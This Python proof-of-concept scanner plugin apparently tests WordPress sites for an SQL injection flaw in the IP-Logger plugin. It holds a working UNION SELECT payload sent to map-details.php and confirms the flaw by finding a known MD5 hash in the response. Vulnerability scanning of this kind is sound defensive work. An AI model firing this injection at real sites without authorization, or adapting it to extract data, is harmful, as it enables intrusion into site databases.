#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
POC Name  : WordPress IP-Logger plugin <= 3.0 SQL Injection Vulnerability
From : http://www.exploit-db.com/exploits/17673/
"""
def assign(service, arg):
    if service == "wordpress":
        return True, arg

def audit(arg):
    url = arg
    
    payload = ("/wp-content/plugins/ip-logger/map-details.php?lat=-1%20UNION%20ALL%20SELECT%20MD5(3.14),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20&lon=-1&blocked=-1%20")
    target_url=url + payload
    code, head, body, _, _ = curl.curl("%s" % target_url)
    if body.find('4beed3b9c4a886067de0e3a094246f78') != -1 :
        security_hole(target_url)

if __name__ == '__main__':
    import sys
    from dummy import *
    audit(assign('wordpress', 'http://www.example.com/')[1])